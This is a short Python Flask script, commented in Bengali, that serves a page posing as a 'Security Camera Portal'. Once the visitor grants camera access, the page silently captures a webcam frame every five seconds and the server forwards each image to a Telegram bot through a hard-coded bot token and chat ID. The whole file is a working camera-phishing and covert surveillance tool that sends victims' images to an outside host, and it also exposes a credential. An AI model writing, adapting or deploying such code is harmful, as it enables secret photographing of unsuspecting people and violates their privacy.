import os
import base64
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

BOT_TOKEN = "8397043572:AAE8gSE0AtCmtSUQcWqMfOSLDw6F5Lemkw4"
CHAT_ID = "5908310559"

# ফ্রন্টএন্ড ওয়েব পেজের কোড
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Camera Monitor</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: #121212; color: #fff; padding-top: 30px; }
        video { width: 90%; max-width: 400px; border: 2px solid #00fff0; border-radius: 10px; margin-bottom: 10px; }
        .status { font-weight: bold; color: #00fff0; }
    </style>
</head>
<body>
    <h2>Security Camera Portal</h2>
    <p class="status">অনুমতি দিন এবং ক্যামেরা চালু রাখুন</p>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // ক্যামেরা এক্সেস নেওয়ার জন্য
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // ক্যামেরা সফলভাবে চালু হলে প্রতি ৫ সেকেন্ড পর পর ফ্রেম পাঠাবে
                setInterval(captureAndSend, 5000);
            })
            .catch(err => alert("ক্যামেরা এক্সেস প্রয়োজন: " + err));

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg');

            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        image_data = data['image'].split(',')[1]
        image_bytes = base64.b64decode(image_data)

        # টেলিগ্রাম বটে ছবি পাঠানো
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', image_bytes, 'image/jpeg')}
        payload = {'chat_id': CHAT_ID}
        
        requests.post(url, data=payload, files=files)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # আপনার লোকাল নেটওয়ার্কে সার্ভার চালু করা
    app.run(host='0.0.0.0', port=5000)
        
